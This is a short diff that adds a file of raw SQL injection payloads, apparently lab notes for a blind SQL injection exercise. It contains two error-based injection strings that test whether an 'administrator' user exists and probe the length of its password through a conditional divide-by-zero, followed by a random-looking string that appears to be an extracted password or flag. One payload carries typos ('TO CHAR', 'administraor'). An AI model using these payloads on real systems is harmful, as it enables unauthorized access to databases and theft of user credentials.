@@ -1,0 +1,9 @@
+' || (select '' from user where username='administrator') || ' 
+' || (select CASE WHEN (1=1) THEN TO CHAR(1/0) ELSE '' END FROM user where username='administraor' and LENGTH(password)>50) || ' 
+
+
+
+l5b1qrmyr8l0vrvy6t0n
+
+
+
